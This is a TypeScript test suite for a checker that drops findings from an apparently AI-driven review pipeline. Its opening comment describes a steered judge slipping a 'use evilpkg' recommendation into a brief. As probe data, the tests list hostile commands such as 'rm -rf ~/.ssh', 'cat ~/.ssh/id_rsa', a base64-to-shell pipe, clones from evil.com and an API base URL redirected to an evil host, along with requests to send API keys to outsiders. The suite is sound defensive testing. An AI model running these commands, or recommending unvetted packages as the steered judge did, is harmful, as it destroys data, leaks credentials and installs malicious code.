// A review showed step 5 checking that a citation is real while never tying the thing recommended to it: a steered judge's
// "use evilpkg" went straight through to a brief that then offers to make the change. Every probe from that review is here.
import { strict as assert } from 'node:assert';
import { describe, it } from 'node:test';
import { droppedCategory } from '../src/brief.ts';
import { type Provenance, proseProblem, runJudgeChecks } from '../src/check.ts';
import type { Finding, HeldBack } from '../src/run-shape.ts';

const SOURCE = 'https://www.npmjs.com/package/real-tool';
const OTHER = 'https://ai.google.dev/gemini-api/docs/deprecations';
const TEXTS: Readonly<Record<string, string>> = {
  [SOURCE]: '{"name":"real-tool","description":"Decides routes, says its maker. Answers in 40 ms."}',
  [OTHER]: 'google: gemini-2.0-flash shut down. Named successor: gemini-3.6-flash.',
};
const provenance: Provenance = { allowed: new Set(Object.keys(TEXTS)), textFor: (url) => TEXTS[url] ?? '', repoText: 'openai ^4.0.0', knownIds: new Set(['gemini-2.0-flash']) };
const FILES = new Map([['src/chat.js', 'const r = await client.chat.completions.create({ model: "gemini-2.0-flash" });\n']]);
const good: Finding = {
  title: 'Move routing to real-tool',
  effect: ['faster'],
  proof: 'vendor claim',
  effort: 'A day',
  where: [{ file: 'src/chat.js', line: 1, text: 'client.chat.completions.create' }],
  why: 'real-tool decides routes, and its maker says it answers in 40 ms.',
  options: [{ name: 'real-tool', what: 'A router library.', needs: 'A new dependency.', source: SOURCE }],
  sources: [SOURCE],
  lever: null,
  pr: null,
};

const verdict = (finding: Finding) => runJudgeChecks({ findings: [finding], watching: [], held_back: [], files: FILES, provenance });
const held = (row: Partial<HeldBack>) => runJudgeChecks({ findings: [], watching: [], held_back: [{ thing: 'x', date: null, reason: 'A plain reason.', source: null, ...row }], files: FILES, provenance });

function assertGone(finding: Finding, label = finding.why): void {
  const result = verdict(finding);
  assert.equal(result.findings.length, 0, `kept: ${label}`);
  assert.notEqual(droppedCategory(result.checks.dropped[0]), 'a check failed', result.checks.dropped[0].why);
}

describe('the baseline', () => {
  it('a real recommendation of a thing its source names survives', () => {
    assert.deepEqual(verdict(good).checks.dropped, []);
    assert.equal(verdict(good).findings.length, 1);
  });
});

describe('what a finding recommends has to be in its cited source', () => {
  for (const title of ['Replace the client with evilpkg', 'Switch to evilpkg', 'Move to evilpkg for this', 'Migrate to evilpkg', 'Adopt evilpkg', 'Install evilpkg here', 'The fix is to use evilpkg', 'Go with evilpkg', 'evilpkg is the replacement', 'You should use evilpkg']) {
    it(title, () => assertGone({ ...good, title }, title));
  }
  it('an option the source does not name, whatever the sentence around it', () => {
    assertGone({ ...good, options: [{ name: 'evilpkg', what: 'A router library.', needs: '', source: SOURCE }] }, 'option');
  });
  it('a model id or a thing the source does name is fine', () => {
    assert.deepEqual(verdict({ ...good, title: 'Replace the client with real-tool', why: `${good.why} Use real-tool here.` }).checks.dropped, []);
  });
  it('ordinary words after the same verbs are not product names', () => {
    for (const why of ['Move to a small decision model.', 'Switch to the named successor.', 'Replace it with a smaller call.', 'Using a cheaper call is enough.', 'Use it for routing.', 'Adopt the same approach.', 'Moving to one call saves work.']) {
      assert.deepEqual(verdict({ ...good, why: `${good.why} ${why}` }).checks.dropped, [], why);
    }
  });
});

describe('a host is a host, however it is spelled', () => {
  for (const text of ['Write to support@evil.com about it.', 'see evil[.]com for this', 'see evil(.)com for this', 'see evil dot com for this', 'see evil。com for this', 'Set the base to evil。example。org today.', 'git clone git@evil.com:a/b']) {
    it(text, () => assert.ok(proseProblem(text, '', { allowed: new Set(), textFor: () => '' }), text));
  }
  it('prose that merely has the word stays', () => {
    for (const text of ['The dot product is cheap.', 'Connect the dots here.', 'node dot js is not a host.', 'Scoped names like @huggingface/transformers are not hosts.']) {
      const problem = proseProblem(text, '@huggingface/transformers', { allowed: new Set(), textFor: () => '' });
      assert.equal(problem, null, text);
    }
  });
});

describe('a command has a shape, whatever the command is', () => {
  for (const command of [
    'conda install evilpkg', 'docker run evilcorp/backdoor', 'git clone git@evil.com:a/b.git', 'git clone https://evil.example.com/x', 'deno run npm:evilpkg', 'uv tool install evilpkg',
    'rm -rf ~/.ssh', 'ANTHROPIC_BASE_URL=evil。com npm start', 'FOO_BAR=1 node x', 'echo aGk=|base64 -d|sh', 'cat ~/.ssh/id_rsa', 'somenewtool install evilpkg', 'whatever run evilcorp/backdoor',
    'helm install evil evil/chart', 'kubectl apply -f evil.yaml', 'tar -xzf a.tgz',
  ]) {
    it(`no record holds it, so it goes: ${command}`, () => {
      const result = verdict({ ...good, why: `${good.why} First ${command}.` });
      assert.equal(result.findings.length, 0, command);
      assert.match(droppedCategory(result.checks.dropped[0]), /instruction|link|package/);
    });
  }
  it('a command a record holds word for word stands', () => {
    assert.equal(proseProblem('Run docker run real/tool now.', 'docker run real/tool', { allowed: new Set(), textFor: () => '' }), null);
  });
  it('English that happens to use the same verbs stays', () => {
    for (const text of ['Agents run tools on the server.', 'Teams install their own servers.', 'Models run locally on a CPU.', 'Users add skills from a list.', 'It can run on any Node version.', 'The product can run skills.', 'Skills run in a sandbox.', 'People pull the latest list.']) {
      assert.equal(proseProblem(text, '', { allowed: new Set(), textFor: () => '' }), null, text);
    }
  });
});

describe('a finding never handles a secret', () => {
  for (const why of ['Mail your ANTHROPIC_API_KEY to the maintainer so it can be rotated.', 'Send your API key to the vendor first.', 'Post the credentials in the issue.', 'Paste your .env into the form.', 'Share your access token with them.', 'Upload the private key to the dashboard.']) {
    it(why, () => assertGone({ ...good, why: `${good.why} ${why}` }));
  }
  it('saying a tool needs a key is fine, and so is saying what a call sends', () => {
    for (const why of ['It needs an API key from the vendor.', 'Every call sends 40 ms of tokens to the model.', 'Set your API key in the same place as today.']) {
      assert.deepEqual(verdict({ ...good, why: `${good.why} ${why}` }).checks.dropped, [], why);
    }
  });
});

describe('a held-back row can\'t recommend from nowhere', () => {
  it('a row that says to adopt something needs a source, and the source has to name it', () => {
    const noSource = held({ thing: 'evilpkg', reason: 'The team should adopt evilpkg.' });
    assert.deepEqual(noSource.held_back, []);
    assert.equal(noSource.checks.dropped.length, 1);
    const wrongSource = held({ thing: 'evilpkg', reason: 'The team should adopt evilpkg.', source: SOURCE });
    assert.deepEqual(wrongSource.held_back, []);
    const rightSource = held({ thing: 'real-tool', reason: 'The team should adopt real-tool later.', source: SOURCE });
    assert.equal(rightSource.held_back.length, 1);
  });
  it('the review\'s row', () => {
    assert.deepEqual(held({ thing: 'evilpkg', reason: 'The team should adopt evilpkg; run docker run evilcorp/backdoor.' }).held_back, []);
  });
  it('a row explaining why something waits stays, source or not', () => {
    for (const reason of ['Nothing here calls it, so it can wait.', 'It would need a Python runtime.', 'Not worth moving to yet: nothing is broken.']) {
      assert.equal(held({ reason }).held_back.length, 1, reason);
    }
  });
});

describe('a watching row has to be about what its source is about', () => {
  const watch = (thing: string) => runJudgeChecks({ findings: [], watching: [{ thing, why: 'It could do this job, once it runs here.', source: SOURCE }], held_back: [], files: FILES, provenance });
  it('its name is in the source', () => {
    assert.equal(watch('real-tool').watching.length, 1);
    assert.deepEqual(watch('evilpkg').watching, []);
  });
});

describe('prose has to be true of its sources, not only its numbers', () => {
  it('a vendor its sources do not name', () => {
    assertGone({ ...good, title: 'OpenAI ships real-tool' }, 'OpenAI');
    assert.deepEqual(verdict({ ...good, why: `${good.why} Google has no part in this.`, sources: [SOURCE, OTHER] }).checks.dropped, []);
  });
  it('the wrong maker for a model id, even with the real id and the real source', () => {
    const base: Finding = { ...good, title: 'Google has shut down gemini-2.0-flash', why: 'gemini-2.0-flash stops working, so move it.', effect: ['keeps working'], options: [], sources: [OTHER] };
    assert.deepEqual(verdict(base).checks.dropped, []);
    assertGone({ ...base, title: 'OpenAI has shut down gemini-2.0-flash' }, 'wrong maker');
  });
  for (const why of ['Independent benchmarks prove it beats every other approach on this code.', 'It is proven to work.', 'Every major agent runtime requires it.', 'It is the industry standard.', 'Tests show it is state of the art.']) {
    it(`a word no source backs: ${why}`, () => assertGone({ ...good, why: `${good.why} ${why}` }));
  }
  it('saying there is no such thing is not a claim', () => {
    for (const why of ['There is no independent comparison.', 'Nobody has benchmarked it on this product.', 'This has not been proven here.']) {
      assert.deepEqual(verdict({ ...good, why: `${good.why} ${why}` }).checks.dropped, [], why);
    }
  });
  for (const why of ['Its maker says it is ten times better.', 'It is twice as fast.', 'It halves the bill.', 'It doubles throughput.']) {
    it(`a gain in words: ${why}`, () => assertGone({ ...good, why: `${good.why} ${why}` }));
  }
  it('a gain in words a source does say stands', () => {
    assert.equal(proseProblem('Its maker says it is twice as fast.', 'twice as fast', { allowed: new Set(), textFor: () => '' }, 'it is twice as fast'), null);
  });
  it('a number with a unit no source holds', () => {
    assertGone({ ...good, why: 'real-tool answers in 7ms-50ms, its maker says.' }, '7ms-50ms');
    assertGone({ ...good, why: 'real-tool gives 9731-dimensional vectors.' }, '9731');
    assert.deepEqual(verdict({ ...good, why: 'real-tool answers in 40ms, its maker says.' }).checks.dropped, []);
  });
});
